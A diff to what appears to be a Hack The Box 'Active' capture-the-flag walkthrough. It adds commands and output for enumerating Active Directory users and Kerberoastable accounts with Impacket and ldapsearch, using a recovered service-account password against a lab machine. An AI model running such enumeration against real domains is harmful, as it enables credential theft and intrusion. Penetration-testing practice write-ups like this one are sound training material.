@@ -11,6 +11,9 @@
     * [Remote BloodHound](#remote-bloodhound)
     * [Kerberoast Attack](#kerberoast-attack)
     * [Password Cracking - TGT](#cracking-tgt-password)
+  * [Alternate Methods](#alternate-methods)
+    * [Enumerate Users](#enumerating-users)
+    * [Enumerate Kerberoastable Users](#enumerate-kerberoastable-users)
 <!--te-->
 
 # **Port & Service Enumeration**
@@ -385,4 +388,43 @@ smb: \> ls
   SVC_TGS                             D        0  Sat Jul 21 10:16:32 2018
 
 		5217023 blocks of size 4096. 277863 blocks available
+```
+
+
+###############################################################################################################################################################
+
+# **Alternate Methods**
+
+## **Enumerate Users**
+
+```bash
+GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100
+Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
+Password: GPPstillStandingStrong2k18
+[*] Querying 10.10.10.100 for information about domain.
+Name Email PasswordLastSet LastLogon 
+---------------- -------- ------------------------- -------------------
+Administrator 2018-07-18 20:06:40.351723 2023-11-27 09:57:39.876136 
+Guest <never> <never> 
+krbtgt 2018-07-18 19:50:36.972031 <never> 
+SVC_TGS 2018-07-18 21:14:38.402764 2018-07-21 15:01:30.320277
+```
+
+```bash
+ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b
+"dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!
+(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" samaccountname | grep sAMAccountName
+sAMAccountName: Administrator
+sAMAccountName: SVC_TGS
+```
+
+## **Enumerate Kerberoastable Users**
+
+```bash
+ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b
+"dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!
+(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))"
+serviceprincipalname | grep -B 1 servicePrincipalName
+dn: CN=Administrator,CN=Users,DC=active,DC=htb
+servicePrincipalName: active/CIFS:445
 ```
